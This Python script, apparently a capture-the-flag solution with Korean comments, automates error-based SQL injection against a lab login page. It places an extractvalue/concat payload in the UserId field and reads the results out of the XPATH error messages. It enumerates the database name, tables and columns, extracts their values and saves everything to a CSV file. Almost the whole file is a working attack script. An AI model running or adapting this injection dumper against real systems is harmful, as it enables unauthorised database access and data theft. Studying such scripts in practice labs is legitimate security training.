import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import pandas as pd

base_url = 'http://ctf2.segfaulthub.com:7777/sqli_2_2/login.php'
headers = {'User-Agent': generate_user_agent(os='win', device_type='desktop')}
data = {
    "UserId": "",        # 사용자 ID
    "Password": "super", # 비밀번호
    "Submit": "Login"         # 버튼 값
}

def fetch_data(query, limit):
    results = []
    for index in range(limit):
        data ['UserId'] = f"normaltic' and extractvalue('1',concat(0x3a, ({query} limit {index},1))) and '1'='1' #"
        response = requests.post(base_url, headers=headers, data=data)
        soup = BeautifulSoup(response.text, "html.parser")
        
        try:
            result = soup.find("form", {"class": "form-signin"}).contents[-1].strip() 
            if result != '존재하지 않는아이디입니다.':
                result = result.replace("Could not update data: XPATH syntax error: ':", "").replace("'", "")
                if result:  # 빈 값은 제외
                    results.append(result)
            else:
                break
        except AttributeError:
            break
    return results

def fetch_schemas():
    query = "select database()"
    return fetch_data(query, 99)

def fetch_tables(db_name):
    query = f"select table_name from information_schema.tables where table_schema='{db_name}'"
    return fetch_data(query, 4)

def fetch_columns(table_name, db_name):
    query = f"select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'"
    return fetch_data(query, 10)

def fetch_data_from_column(column_name, table_name, db_name):
    query = f"select {column_name} from {db_name}.{table_name}"
    return fetch_data(query, 20)

import pandas as pd

def fetch_all_data():
    # 모든 스키마, 테이블, 컬럼 데이터를 가져오는 메서드
    all_data = []
    schemas = fetch_schemas()
    #print("Schemas:", schemas)
    
    if schemas:
        for schema in schemas:
            if schema:  # 비어있지 않은 스키마에 대해 처리
                #print(f"\nSchema: {schema}")
                tables = fetch_tables(schema)
                #print(f"{schema}:", tables)
                
                for table in tables:
                    if table:  # 비어있지 않은 테이블에 대해 처리
                        #print(f"\nTable: {table}")
                        columns = fetch_columns(table, schema)
                        #print(f"{table}:", columns)
                        
                        for column in columns:
                            if column:  # 비어있지 않은 컬럼에 대해 처리
                                data = fetch_data_from_column(column, table, schema)
                                #print(f"{column}:", data)
                                if data:  # 빈 데이터 제외
                                    # 데이터를 리스트로 저장
                                    for value in data:
                                        all_data.append({
                                            'Schema': schema,
                                            'Table': table,
                                            'Column': column,
                                            'Value': value
                                        })
    
    # 데이터를 DataFrame으로 변환
    df = pd.DataFrame(all_data)
    
    # 엑셀 파일로 저장
    output_file = r'C:\Users\User\Desktop\hacking\파이썬\output_data.csv'
    df.to_csv(output_file, index=False)
    print(f"Data saved to {output_file}")
    
    return all_data


if __name__ == "__main__":
    all_data = fetch_all_data()
    #print("\nAll Data:", all_data)
